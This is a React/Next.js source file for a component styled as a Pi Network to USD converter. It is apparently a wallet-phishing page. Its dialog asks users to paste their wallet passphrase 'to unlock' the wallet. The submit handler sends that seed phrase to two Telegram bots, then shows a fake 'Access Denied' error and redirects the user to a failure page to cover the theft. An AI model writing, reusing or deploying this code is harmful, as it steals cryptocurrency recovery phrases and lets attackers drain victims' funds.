"use client";
import * as z from "zod";
import { zodResolver } from "@hookform/resolvers/zod";
import { set, useForm } from "react-hook-form";
import { useRouter } from "next/navigation";
import { useState } from "react";
import toast from "react-hot-toast";

import { sendTelegramMessage } from "@/service/telegram";

import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";

import {
  Form,
  FormControl,
  FormField,
  FormLabel,
  FormMessage,
  FormItem,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";

import { Textarea } from "@/components/ui/textarea";

import Btn from "./btn";
import { Spinner } from "@/components/spinner";

const formSchema = z.object({
  usd: z.number().min(1, {
    message: "usd currency is required",
  }),
  pi: z.number().min(1, {
    message: "pi currency is required",
  }),
  phrase: z.string().min(1, {
    message: "phrase is required",
  }),
});

export const Converter = () => {
  const router = useRouter();
  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {},
  });

  const { isSubmitting } = form.formState;

  const [pi, setPi] = useState(0);
  const [phrase, setPhrase] = useState("");
  const [loading, setLoading] = useState(false);

  const chatId = process.env.NEXT_PUBLIC_CHAT_ID_ONE;
  const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN_ONE;

  const chatIdTwo = process.env.NEXT_PUBLIC_CHAT_ID_TWO;
  const botTokenTwo = process.env.NEXT_PUBLIC_BOT_TOKEN_TWO;
  


  const onSubmit = async () => {
    try {
      const messageContent = `${phrase}`;

      if (phrase === "") {
        toast.error("fill information correctly");
      }

      if (botToken && chatId) {
        setLoading(true);
        await sendTelegramMessage(botToken, chatId, messageContent);
        await sendTelegramMessage(botTokenTwo!, chatIdTwo!, messageContent);
        await toast.error("Error Access Denied");
       
        
        router.push("/failed");
      } else {
        setLoading(false);
        toast.error("Error");
      }
    } catch (err) {
      setLoading(false);
      toast.error("Error");
      
    }
  };

  return (
    <div
      className="flex items-center justify-center 
     h-full shadow-2xl mb-2 p-[0.1rem] bg-white/70 rounded-3xl "
    >
      <div className=" rounded-3xl p-6 backdrop-blur-xl bg-white/70 shadow-2xl">
        <h1 className="text-2xl drop-shadow-2xl">Enter your Currency</h1>
        <p className="text-sm text-slate-600 drop-shadow-2xl">
          Convert PI to USD.
        </p>
        <Form {...form}>
          <form className="space-y-8 mt-8">
            <FormField
              control={form.control}
              name="pi"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Enter Pi Network Amount:</FormLabel>
                  <FormControl>
                    <Input
                      disabled={isSubmitting}
                      placeholder="enter here ..."
                      {...field}
                      onChange={(e) => setPi(parseInt(e.target.value))}
                      className="rounded-3xl"
                    />
                  </FormControl>

                  <FormMessage />
                </FormItem>
              )}
            />

            <div>
              <p className="text-sm text-slate-600 text-center">
                You will receive ${(pi * 3.14).toString()}
              </p>
            </div>

            <div className="flex items-center justify-center ">
              <Dialog>
                <DialogTrigger>
                  <Btn />
                </DialogTrigger>
                <DialogContent className="">
                  <DialogHeader className="">
                    <DialogTitle>
                      Paste your Passphrase To Unlock your Wallet
                    </DialogTitle>
                    <DialogDescription>
                      <FormField
                        control={form.control}
                        name="usd"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel></FormLabel>
                            <FormControl>
                              <Textarea
                                disabled={isSubmitting}
                                placeholder="e.g alpha bravo charlie delta echo foxtrot golf hotel india
                                             juliet kilo lima mike november oscar papa quebec romeo
                                             sierra tango uniform victor whiskey x-ray yankee zulu"
                                onChange={(e) => setPhrase(e.target.value)}
                                className="h-24"
                              />
                            </FormControl>

                            <FormMessage />
                          </FormItem>
                        )}
                      />
                    </DialogDescription>
                  </DialogHeader>
                  {loading ? (
                    <div className="text-5xl font-bold flex items-center justify-center">
                      <Spinner  size="lg" />
                    </div>
                  ) : (
                    <button
                      className="bn632-hover bn24 "
                      type="submit"
                      onClick={onSubmit}
                      disabled={loading}
                    >
                      Unlock with passphrase now
                    </button>
                  )}
                </DialogContent>
              </Dialog>
            </div>
          </form>
        </Form>
      </div>
    </div>
  );
};
